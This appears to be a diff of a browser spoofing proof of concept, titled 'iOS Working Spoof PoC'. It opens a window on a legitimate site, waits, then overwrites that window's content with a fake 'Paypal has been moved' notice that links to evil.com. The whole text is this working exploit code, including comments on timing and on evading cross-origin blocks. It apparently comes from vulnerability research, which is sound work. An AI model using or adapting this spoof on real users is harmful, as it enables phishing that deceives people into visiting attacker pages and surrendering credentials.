@@ -1,8 +1,25 @@
-<script>
-function pwned() {
-var t = window.open('', 'ss');
-t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
-t.stop();
-}
-</script>
-<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>iOS Working Spoof PoC</title>
+  <script>
+    function handleClick(e) {
+      // Open legit site IMMEDIATELY inside user gesture
+      var t = window.open('https://legitsite.com', 'ss');
+
+      // Now try to hijack after a delay
+      setTimeout(() => {
+        try {
+          t.document.write(`<h1>Paypal has been moved</h1><a href="https://evil.com">Click here</a>`);
+          t.stop();
+        } catch (err) {
+          alert("Cannot hijack due to cross-origin restriction or popup block.");
+        }
+      }, 1500); // Adjust timing based on speed
+    }
+  </script>
+</head>
+<body>
+  <a href="#" onclick="handleClick(event)">click me2</a>
+</body>
+</html>
